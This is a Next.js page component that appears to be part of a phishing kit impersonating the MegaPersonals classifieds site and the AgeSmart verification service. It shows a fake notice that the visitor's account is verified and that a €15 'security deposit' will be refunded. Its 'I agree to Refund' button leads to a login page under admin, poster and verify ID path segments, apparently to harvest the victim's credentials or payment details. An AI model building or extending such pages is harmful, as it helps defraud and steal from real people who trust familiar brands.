import Image from "next/image";
import { useRouter, useParams } from "next/navigation";
import LogoColor from "../../public/images/logo-color.png";
import LogoFooter from "../../public/images/footer-logo.png";

export default function First() {
  const router = useRouter();
  const params = useParams();

  const handleAgree = () => {
    router.push(
      `/${params.adminId}/${params.posterId}/${params.verifyId}/login`
    );
  };

  return (
    <div className="min-h-screen w-full flex flex-col items-center bg-white text-black font-sans">
      {/* Top pink bar */}
      <div className="w-full bg-pink-500 py-4 text-center">
        <h1 className="text-2xl font-bold text-white">
          <span className="text-yellow-300">Mega</span>
          <span className="text-cyan-100">Personals</span>
          <br />
          <span className="text-sm font-normal text-white">
            personals classifieds
          </span>
        </h1>
      </div>

      {/* Main content */}
      <div className="flex flex-col items-center text-center p-6 max-w-2xl">
        {/* Logo */}
        <Image src={LogoColor} alt="AgeSmart Logo" className="w-48 my-3" />

        {/* Text */}
        <p className="text-lg font-medium mb-2">
          Your account has been approved as fully active and verified. IF YOU
          ARE REFUND{" "}
          <span className="text-[#9b59b6] font-bold">€15 MegaPersonals</span>
        </p>

        <p className="text-base my-2 font-semibold">breaking their rules,</p>

        <p className="text-green-700 font-bold mb-4">
          Your account will remain active as it is now.
        </p>

        <p className="mb-4">from AgeSmart.</p>

        {/* Why Getting the Money (scrollable box) */}
        <div className="w-full max-w-lg border rounded shadow-inner h-40 overflow-y-scroll text-left p-4 mb-6 text-sm">
          <ul className="list-disc pl-4 space-y-2">
            <li>
              A certain amount was taken as a security deposit to ensure policy
              compliance.
            </li>
            <li>Your performance and dedication have impressed us.</li>
            <li>You showed no negative behavior during your time.</li>
            <li>We’ve decided to refund your full security deposit.</li>
            <li>
              This is our way of saying thank you and encouraging your good
              work.
            </li>
            <li>
              The amount is your rightful due and a token of appreciation.
            </li>
          </ul>
          <p className="mt-4">
            See MegaPersonals for their full website Terms of Use and Publisher
            Agreement.
          </p>
        </div>

        {/* Button */}
        <button
          onClick={handleAgree}
          className="bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-full font-semibold mb-6"
        >
          I agree to Refund
        </button>

        {/* Bottom icon */}
        <Image src={LogoFooter} alt="Verified" className="w-16 mb-2" />

        {/* Footer */}
        <p className="text-xs text-gray-500">
          Copyright © 2022 Age Smart LDA. All Rights Reserved.
        </p>

        <div className="flex space-x-4 mt-1 text-blue-600 text-sm underline">
          <a href="#">Terms of Use</a>
          <a href="#">Privacy Policy</a>
          <a href="#">Billing Questions</a>
        </div>
      </div>
    </div>
  );
}
